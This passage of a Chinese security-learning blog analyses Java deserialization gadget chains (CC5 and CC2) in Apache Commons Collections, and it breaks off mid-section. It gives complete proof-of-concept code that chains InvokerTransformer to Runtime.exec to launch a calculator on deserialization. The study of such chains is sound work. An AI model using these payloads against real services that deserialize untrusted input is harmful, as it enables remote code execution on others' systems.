<p>只需要控制valObj为TiedMapEntry对象即可利⽤这条调⽤链 valObj通过ObjectInputStream.readFields().get()获取</p>
<p>来看看构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">   <span class="keyword">public</span> <span class="title function_">BadAttributeValueExpException</span> <span class="params">(Object val)</span> &#123;</span><br><span class="line">       <span class="built_in">this</span>.val = val == <span class="literal">null</span> ? <span class="literal">null</span> : val.toString();</span><br><span class="line">   &#125;</span><br><span class="line"><span class="keyword">private</span> Object val;</span><br></pre></td></tr></table></figure>

<p>为了一开始不触发toString方法我们可以用反射来设置这个值,也可以在transform哪里改了</p>
<h1 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h1><p>使用上述新扩展的触发点，配合 LazyMap 就可以完成一条新的攻击路径。由于 ysoserial 使用了 ChainedTransformer + InvokerTransformer 的方式，我这里就使用这种方法啦，当然还可以使用<br>InvokerTransformer + TemplatesImpl &#x2F; TrAXFilter + InstantiateTransformer + TemplatesImpl 的方式触发</p>
<p>所以直接造poc了</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(hashMap,transformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">entry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map,<span class="string">&quot;baicany&quot;</span>);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">bad</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>((<span class="literal">null</span>));</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> bad.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(bad,entry);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc5.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(bad);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc5.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;</span><br><span class="line">    TiedMapEntry.toString-&gt;</span><br><span class="line">    	TiedMapEntry.getValue-&gt;</span><br><span class="line">    		LazyMap.get()-&gt;</span><br><span class="line">    			transformer()-&gt;</span><br><span class="line">    			....</span><br><span class="line">    			exec()</span><br></pre></td></tr></table></figure>

<p>利用链也挺简单的,就缩写了</p>
<p>依赖版本</p>
<blockquote>
<p>commons-collections : 3.1～3.2.1jdk 8u76 without a security manager</p>
</blockquote>
]]></content>
      <categories>
        <category>学习记录</category>
      </categories>
      <tags>
        <tag>web</tag>
      </tags>
  </entry>
  <entry>
    <title>cc链2</title>
    <url>/2023/07/13/cc2/</url>
    <content><![CDATA[<p>前面分析了CC1的利用链，但是在CC1的利用链中是有版本的限制的。在JDK1.8 8u71版本以后，对<code>AnnotationInvocationHandler</code>的<code>readobject</code>进行了改写。导致高版本中利用链无法使用。</p>
<p>这就有了其他的利用链，在CC2链里面并不是使用 <code>AnnotationInvocationHandler</code>来构造，而是使用 <code>javassist</code>和<code>PriorityQueue</code>来构造利用链。</p>
<p>CC2链中使用的是<code>commons-collections-4.0</code>版本，但是CC1在<code>commons-collections-4.0</code>版本中其实能使用，但是<code>commons-collections-4.0</code>版本删除了<code>lazyMap</code>的<code>decode</code>方法，这时候我们可以使用<code>lazyMap</code>方法来代替。但是这里产生了一个疑问，为什么CC2链中使用<code>commons-collections-4.0 </code>3.2.1-3.1版本不能去使用，使用的是<code>commons-collections-4.0</code>4.0的版本？在中间查阅了一些资料，发现在3.1-3.2.1版本中<code>TransformingComparator</code>并没有去实现<code>Serializable</code>接口,也就是说这是不可以被序列化的。所以在利用链上就不能使用他去构造。</p>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
<p>因此，放入PriorityQueue的元素，需要实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。<br>PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 <code>queue</code> 中之后，会调用 <code>heapify()</code> 方法来对数据进行排序。<code>heapify()</code> 方法调用 <code>siftDown()</code> 方法，在 comparator 属性不为空的情况下，调用 <code>siftDownUsingComparator()</code> 方法</p>
<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。这样，反序列化之后的优先级队列，也拥有了顺序。</p>
<p>后面会提</p>
<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</p>
<p>TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。</p>
<p>TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 <code>ComparableComparator.&lt;Comparable&gt;comparableComparator()</code>。</p>
<p><img src="https://su18.org/post-images/1626763893534.png" alt="img"></p>
<p>在调用 TransformingComparator 的 <code>compare</code> 方法时，可以看到调用了 <code>this.transformer.transform()</code> 方法对要比较的两个值进行转换，然后再调用 compare 方法比较。</p>
<p><img src="https://su18.org/post-images/1626764313782.png" alt="img"></p>
<h3 id="动态加载字节码"><a href="#动态加载字节码" class="headerlink" title="动态加载字节码"></a>动态加载字节码</h3><p>看之前写的</p>
<h3 id="javassit"><a href="#javassit" class="headerlink" title="javassit"></a>javassit</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">javassit_test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">createPseson</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 创建一个空类</span></span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">cc</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;Person&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 2. 新增一个字段 private String name;</span></span><br><span class="line">        <span class="comment">// 字段名为name</span></span><br><span class="line">        <span class="type">CtField</span> <span class="variable">param</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtField</span>(pool.get(<span class="string">&quot;java.lang.String&quot;</span>), <span class="string">&quot;name&quot;</span>, cc);</span><br><span class="line">        <span class="comment">// 访问级别是 private</span></span><br><span class="line">        param.setModifiers(Modifier.PRIVATE);</span><br><span class="line">        <span class="comment">// 初始值是 &quot;xiaoming&quot;</span></span><br><span class="line">        cc.addField(param, CtField.Initializer.constant(<span class="string">&quot;xiaoming&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 3. 生成 getter、setter 方法</span></span><br><span class="line">        cc.addMethod(CtNewMethod.setter(<span class="string">&quot;setName&quot;</span>, param));</span><br><span class="line">        cc.addMethod(CtNewMethod.getter(<span class="string">&quot;getName&quot;</span>, param));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 4. 添加无参的构造函数</span></span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">cons</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);</span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123;name = \&quot;xiaohong\&quot;;&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 5. 添加有参的构造函数</span></span><br><span class="line">        cons = <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;pool.get(<span class="string">&quot;java.lang.String&quot;</span>)&#125;, cc);</span><br><span class="line">        <span class="comment">// $0=this / $1,$2,$3... 代表方法参数</span></span><br><span class="line">        cons.setBody(<span class="string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);</span><br><span class="line">        cc.addConstructor(cons);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 6. 创建一个名为printName方法，无参数，无返回值，输出name值</span></span><br><span class="line">        <span class="type">CtMethod</span> <span class="variable">ctMethod</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtMethod</span>(CtClass.voidType, <span class="string">&quot;printName&quot;</span>, <span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, cc);</span><br><span class="line">        ctMethod.setModifiers(Modifier.PUBLIC);</span><br><span class="line">        ctMethod.setBody(<span class="string">&quot;&#123;System.out.println(name);&#125;&quot;</span>);</span><br><span class="line">        cc.addMethod(ctMethod);</span><br><span class="line">        <span class="comment">// 在方法体前插入代码块</span></span><br><span class="line">		ctMethod.insertBefore(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		<span class="comment">// 在方法体后插入代码块</span></span><br><span class="line">		ctMethod.insertAfter(<span class="string">&quot;&quot;</span>);</span><br><span class="line">		<span class="comment">// 在某行 字节码 后插入代码块</span></span><br><span class="line">		ctMethod.insertAt(<span class="number">10</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">//这里会将这个创建的类对象编译为.class文件</span></span><br><span class="line">        cc.writeFile(<span class="string">&quot;./&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            createPseson();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创造了个类</p>
<p><img src="https://baicany.github.io/images/15918534250002a.png"></p>
<h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses():</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure>



<h3 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h3><p>后半段链和cc1差不多，所以这里可以正向分析，从readObject来学习整条链。</p>
<p>PriorityQueue#readObject：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//   transient Object[] queue; 虽然是 transient但是因为写入的数据后有赋值语句</span></span><br><span class="line"><span class="comment">//   所以还是改了的queue[i] = s.readObject();也没有它的构造方法</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">        s.readInt();</span><br><span class="line"></span><br><span class="line">        queue = <span class="keyword">new</span> <span class="title class_">Object</span>[size];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read in all elements.</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">            queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">        <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">        heapify();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的queue[i]的值是由readObject得到的，也就是说在writeObject处写入了对应的内容：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> java.io.IOException&#123;</span><br><span class="line">    <span class="comment">// Write out element count, and any hidden stuff</span></span><br><span class="line">    s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out array length, for compatibility with 1.5 version</span></span><br><span class="line">    s.writeInt(Math.max(<span class="number">2</span>, size + <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write out all elements in the &quot;proper order&quot;.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        s.writeObject(queue[i]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说我们可以通过反射来设置queue[i]的值来达到控制queue[i]内容的目的。</p>
<p>在readObject处调用了heapify：</p>
<p>这里的queue[i]是我们可控的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">heapify</span><span class="params">()</span> &#123;</span><br><span class="line">      <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (size &gt;&gt;&gt; <span class="number">1</span>) - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">          siftDown(i, (E) queue[i]);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>跟进siftdown</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//private final Comparator&lt;? super E&gt; comparator;</span></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDown</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (comparator != <span class="literal">null</span>)</span><br><span class="line">            siftDownUsingComparator(k, x);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            siftDownComparable(k, x);<span class="comment">//一个普通的比较器</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的x是我们可控的，跟入第一个siftDownUsingComparator：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">siftDownUsingComparator</span><span class="params">(<span class="type">int</span> k, E x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">half</span> <span class="operator">=</span> size &gt;&gt;&gt; <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (k &lt; half) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">child</span> <span class="operator">=</span> (k &lt;&lt; <span class="number">1</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">c</span> <span class="operator">=</span> queue[child];</span><br><span class="line">        <span class="type">int</span> <span class="variable">right</span> <span class="operator">=</span> child + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (right &lt; size &amp;&amp;</span><br><span class="line">            comparator.compare((E) c, (E) queue[right]) &gt; <span class="number">0</span>)</span><br><span class="line">            c = queue[child = right];</span><br><span class="line">        <span class="keyword">if</span> (comparator.compare(x, (E) c) &lt;= <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        queue[k] = c;</span><br><span class="line">        k = child;</span><br><span class="line">    &#125;</span><br><span class="line">    queue[k] = x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>重点：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">comparator.compare(x, (E) c)</span><br><span class="line"><span class="comment">//为什么不能是 comparator.compare((E) c, (E) queue[right])应为第一次传入值的时候half是1,k是,child是1,right是2,size也是2,所以先进下面那个</span></span><br></pre></td></tr></table></figure>

<p>这里的x是我们可控的，cc2中使用了TransformingComparator#compare来触发后续链，看一下这个方法：</p>
<p><img src="https://baicany.github.io/images/159185.jpg" alt="-w562"></p>
<p>可以发现，这里对this.transformer调用了transform方法，如果这个this.transformer可控的话，就可以触发cc1中的后半段链。</p>
<p><img src="https://baicany.github.io/images/1231251.jpg" alt="-w906"></p>
<p>从上图可以看出，this.transformer并没有被transient修饰，而且还可以用public构造方法构造,所以是我们可控的。</p>
<p>构造POC：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc2</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(<span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        String.class, Class[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123;</span><br><span class="line">                        Object.class, Object[].class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;</span><br><span class="line">                        <span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)&#125;);</span><br><span class="line"></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>(chain);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">1</span>);</span><br><span class="line">        </span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(queue,comparator);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">ObjectOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            outputStream.writeObject(queue);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2.txt&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个poc延用了cc1的后半段链，直接在最后触发了ChainedTransformer#transform方法导致rce。但是cc2在yso中的poc并不是这个，而是用到了一个新的点TemplatesImpl。等会分析</p>
<ul>
<li>一些细节的问题</li>
</ul>
<p>1.为什么这里要put两个值进去?</p>
<p><img src="https://baicany.github.io/images/1591853426000-33yuyse.png" alt="-w719"></p>
<p>这里往queue中put两个值，是为了让其size&gt;1，只有size&gt;1才能使的i&gt;0，才能进入siftDown这个方法中，完成后面的链。</p>
<p>2.这里为什么要在add之后才通过反射修改comparator的值?</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">add</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> offer(e);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>add调用了offer方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">offer</span><span class="params">(E e)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (e == <span class="literal">null</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NullPointerException</span>();</span><br><span class="line">    modCount++;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> size;</span><br><span class="line">    <span class="keyword">if</span> (i &gt;= queue.length)</span><br><span class="line">        grow(i + <span class="number">1</span>);</span><br><span class="line">    size = i + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="number">0</span>)</span><br><span class="line">        queue[<span class="number">0</span>] = e;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        siftUp(i, e);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>offer方法中调用了siftUp方法：</p>
<p><img src="https://baicany.github.io/images/1591853426000-36rgleo.png" alt="-w465"></p>
<p>这里需要保证comparator的值为null，才能够正常的添加元素进queue，如果我们在add之前使comparator为我们构造好的TransformingComparator，就会报这么一个错误：</p>
<p><img src="https://baicany.github.io/images/1591853427000-37sqffq.png" alt="-w1159"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">因为在写入的时候就会跳计算器了但是因为</span><br><span class="line">        <span class="type">O</span> <span class="variable">value1</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj1);  就会调用cc1方法弹计算器了</span><br><span class="line">        <span class="type">O</span> <span class="variable">value2</span> <span class="operator">=</span> <span class="built_in">this</span>.transformer.transform(obj2);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.decorated.compare(value1, value2);这里进去</span><br><span class="line">            <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(E obj1, E obj2)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> obj1.compareTo(obj2);</span><br><span class="line">    &#125;因为我们执行了方法里面没有compareTo了</span><br><span class="line">    没有就会普通的比较<span class="number">1</span>,<span class="number">2</span>的大小</span><br></pre></td></tr></table></figure>



<p>我们回过头来看看javassit：</p>
